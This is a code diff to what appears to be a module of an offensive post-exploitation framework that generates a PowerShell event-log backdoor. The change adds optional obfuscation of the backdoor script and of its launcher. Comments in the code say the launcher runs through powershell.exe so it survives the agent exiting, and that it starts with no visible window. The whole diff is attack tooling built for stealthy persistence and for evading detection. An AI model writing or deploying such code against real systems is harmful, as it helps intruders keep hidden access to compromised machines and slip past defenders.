@@ -76,7 +76,7 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         script = """
 function Invoke-EventLogBackdoor
@@ -158,6 +158,8 @@ Invoke-EventLogBackdoor"""
             print helpers.color("[+] PowerBreach deaduser backdoor written to " + outFile)
             return ""
 
+        if obfuscate:
+            script = helpers.obfuscate(psScript=script, obfuscationCommand=obfuscationCommand)
         # transform the backdoor into something launched by powershell.exe
         # so it survives the agent exiting  
         launcher = helpers.powershell_launcher(script) 
@@ -166,6 +168,8 @@ Invoke-EventLogBackdoor"""
 
         # set up the start-process command so no new windows appears
         scriptLauncher = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-EventLogBackdoor started'" % (parts[0], " ".join(parts[1:]))
+        if obfuscate:
+            scriptLauncher = helpers.obfuscate(psScript=scriptLauncher, obfuscationCommand=obfuscationCommand)
 
         print scriptLauncher
         
